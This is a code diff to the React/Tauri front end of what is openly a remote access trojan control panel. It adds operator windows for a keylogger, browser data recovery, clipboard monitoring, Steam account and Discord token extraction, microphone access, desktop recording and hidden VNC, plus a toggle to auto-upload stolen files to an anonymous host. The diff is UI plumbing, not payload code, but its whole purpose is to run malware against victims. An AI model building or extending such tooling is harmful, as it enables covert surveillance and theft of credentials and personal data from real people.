@@ -38,6 +38,24 @@ const translateWindowType = (type: string) => {
       return "Fun Stuff";
     case "input-box":
       return "Input Box";
+    case "keylogger":
+      return "Keylogger";
+    case "browser-data":
+      return "Browser Recovery";
+    case "data-collector":
+      return "Data Collector";
+    case "clipboard":
+      return "Clipboard Monitor";
+    case "software":
+      return "Software Manager";
+    case "steam-account":
+      return "Steam Accounts";
+    case "mic-access":
+      return "Mic Access";
+    case "desktop-recording":
+      return "Desktop Recording";
+    case "discord-extractor":
+      return "Discord Extractor";
     default:
       return type;
   }
@@ -80,6 +98,42 @@ const windowTypeSizes = {
     width: 400,
     height: 500,
   },
+  keylogger: {
+    width: 1000,
+    height: 700,
+  },
+  "browser-data": {
+    width: 1200,
+    height: 800,
+  },
+  "data-collector": {
+    width: 1200,
+    height: 900,
+  },
+  clipboard: {
+    width: 1100,
+    height: 800,
+  },
+  software: {
+    width: 1200,
+    height: 900,
+  },
+  "steam-account": {
+    width: 1200,
+    height: 800,
+  },
+  "discord-extractor": {
+    width: 1000,
+    height: 700,
+  },
+  "mic-access": {
+    width: 900,
+    height: 600,
+  },
+  "desktop-recording": {
+    width: 1100,
+    height: 700,
+  },
 };
 
 export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
@@ -92,6 +146,7 @@ export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
   const [selectedClient, setSelectedClient] = useState<string>("");
   const [_clientWindows, setClientWindows] = useState<ClientWindowType[]>([]);
   const [serverLogs, setServerLogs] = useState<Log[]>([]);
+  const [autoUploadAnonFiles, setAutoUploadAnonFiles] = useState<boolean>(false);
 
   async function fetchState() {
     const state: RATState = await fetchStateCmd();
@@ -178,8 +233,11 @@ const openClientWindow = async (
       resizable: true,
       center: true,
       closable: true,
+      decorations: true,
       width: windowTypeSizes[type as keyof typeof windowTypeSizes].width,
       height: windowTypeSizes[type as keyof typeof windowTypeSizes].height,
+      focus: true,
+      ...(type === "hvnc" ? { alwaysOnTop: true, transparent: false } : {}),
     });
 
     webviewWindow.once("tauri://created", function () {
@@ -258,6 +316,10 @@ const openClientWindow = async (
           customToast("❌", message, genericStyle);
         }
 
+        if (event_type == "server_info" && message.includes("Auto-uploaded")) {
+          customToast("✅", message, genericStyle);
+        }
+
         if (event_type == "build_client") {
           customToast("🔨", message, genericStyle);
         }
@@ -300,6 +362,8 @@ const openClientWindow = async (
     openClientWindow,
     serverLogs,
     getClientByAddr,
+    autoUploadAnonFiles,
+    setAutoUploadAnonFiles,
   };
 
   return <RATContext.Provider value={RATdata}>{children}</RATContext.Provider>;
